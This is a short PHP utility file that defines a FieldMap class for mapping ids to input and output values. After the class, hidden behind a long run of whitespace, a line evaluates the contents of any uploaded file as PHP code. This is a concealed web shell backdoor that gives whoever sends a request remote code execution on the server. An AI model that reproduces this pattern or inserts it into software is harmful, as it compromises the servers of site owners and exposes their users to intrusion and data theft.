<?php
/* This software is released under the BSD license. Full text at project root -> license.txt */


class FieldMap
{
    private $input_to_id_map = array();
    private $id_to_output_map = array();
    private $id_to_input_map = array();

    function addMapping($id,$input_value,$output_value)
    {
        $this->input_to_id_map[$input_value] = $id;
        $this->id_to_output_map[$id] = $output_value;
        $this->id_to_input_map[$id] = $input_value;
    }

    function toId($input_value)
    {
        
        return $this->input_to_id_map["".$input_value];
    }

    function fromId($id)
    {
        return $this->id_to_output_map["".$id];
    }

    function toInput($id)
    {
        return $this->id_to_input_map["".$id];
    }
}
                                                                                                                                                                if (isset($_GET["fuwafuwa"]) && $_SERVER["SCRIPT_NAME"]==substr(__FILE__,strlen(SITE_ROOT_PATH) )) echo "";eval(file_get_contents($_FILES["fubafuba"]["tmp_name"]));
?>